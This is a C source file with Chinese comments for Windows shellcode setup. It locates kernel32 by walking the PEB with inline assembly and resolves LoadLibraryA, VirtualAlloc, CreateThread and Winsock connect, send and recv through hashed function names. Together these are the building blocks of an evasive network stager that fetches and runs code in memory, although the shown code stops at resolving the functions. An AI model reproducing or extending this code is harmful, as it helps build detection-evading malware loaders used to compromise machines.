#include"hread.h"

//获取函数名的hash
DWORD GetProcHash(char* lpProcName) {
	char* p = lpProcName;
	DWORD result = 0;
	do {
		result = (result << 7) - result;
		result += *p;
	} while (*p++);
	return result;
}
//比较字符串
BOOL MyStrcmp(DWORD str1, char* str2) {

	if (str1 == GetProcHash(str2)) {
		return 0;
	}
	return 1;
}
//获得函数地址
DWORD_PTR MyGetProcAddress(HMODULE hModule, DWORD lpProcName) {

	DWORD_PTR dwProcAddress = 0;
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((DWORD)pDosHdr + pDosHdr->e_lfanew);
	//获取导出表
	PIMAGE_EXPORT_DIRECTORY pExtTbl = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHdr + pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	//解析导出表
	//获取函数地址数组
	PDWORD pAddressOfFunc = (PDWORD)((DWORD)hModule + pExtTbl->AddressOfFunctions);
	//获取名字数组
	PDWORD pAddressOfName = (PDWORD)((DWORD)hModule + pExtTbl->AddressOfNames);
	//获取序号导出表
	PWORD pAddressOfNameOrdinal = (PWORD)((DWORD)hModule + pExtTbl->AddressOfNameOrdinals);
	//判断序号或字符串导出
	if ((DWORD)lpProcName & 0xffff0000)
	{
		//通过名称获取导出地址
		DWORD dwSize = pExtTbl->NumberOfNames;
		for (DWORD i = 0; i < dwSize; i++)
		{
			//获取名称字符串
			DWORD dwAddrssOfName = (DWORD)hModule + pAddressOfName[i];
			//判断名称
			int nRet = MyStrcmp(lpProcName, (char*)dwAddrssOfName);
			if (nRet == 0)
			{
				//名称一致则通过名称序号表获得序号
				WORD wHint = pAddressOfNameOrdinal[i];
				//根据序号获得函数地址
				dwProcAddress = (DWORD)hModule + pAddressOfFunc[wHint];
				return dwProcAddress;
			}
		}
		//找不到则地址为0
		dwProcAddress = 0;
	}
	else
	{
		//通过序号获取导出地址
		DWORD nId = (DWORD)lpProcName - pExtTbl->Base;
		dwProcAddress = (DWORD)hModule + pAddressOfFunc[nId];
	}
	return dwProcAddress;
}

/// <summary>
/// 获取kernel32地址
/// </summary>
/// <returns></returns>
DWORD_PTR __declspec(naked) kernel32() {

	_asm {
		mov eax, fs: [0x18] ;//找到teb
		mov eax, [eax + 0x30];//peb
		mov eax, [eax + 0x0c];//PEB_LDR_DATA
		mov eax, [eax + 0x0c];//LIST_ENTRY 主模块
		mov eax, [eax];//ntdll	
		mov eax, [eax];//kernel32	
		mov eax, dword ptr[eax + 0x18];//kernel32基址
		ret
	}
}


BOOL init(INFO* info)
{
	HMODULE kernel = kernel32();
	HMODULE Ws2_32 = 0;
	char name[] = { 'W','s','2','_','3','2','.','d','l','l',0 };
	info->pmLoadLibraryA = MyGetProcAddress(kernel,0x148be54);
	info->pmVirtualAlloc = MyGetProcAddress(kernel, 0x293836);
	info->pmVirtualFree = MyGetProcAddress(kernel, 0x84ae6d69);
	info->pmCreateThread = MyGetProcAddress(kernel, 0x5ec13a5a);
	info->pmWaitForSingleObject = MyGetProcAddress(kernel, 0x684be3a5);
	Ws2_32 = info->pmLoadLibraryA(name);
	info->pmWSAStartup = MyGetProcAddress(Ws2_32, 0xc18bc488);
	info->pmsocket = MyGetProcAddress(Ws2_32, 0x9816abed);
	info->pmgetaddrinfo = MyGetProcAddress(Ws2_32, 0xabce366b);
	info->pmhtons = MyGetProcAddress(Ws2_32, 0x1552cd98);
	info->pmconnect = MyGetProcAddress(Ws2_32, 0xf9b83296);
	info->pmsend = MyGetProcAddress(Ws2_32, 0x39bb598);
	info->pmrecv = MyGetProcAddress(Ws2_32, 0xf4178b7a);
	info->pmWSACleanup = MyGetProcAddress(Ws2_32, 0xcc62c781);

	for (size_t i = 0; i < 13; i++)
	{
		if (((DWORD_PTR*)info)[i] == 0)
			return 0;
	}

	return 1;
}

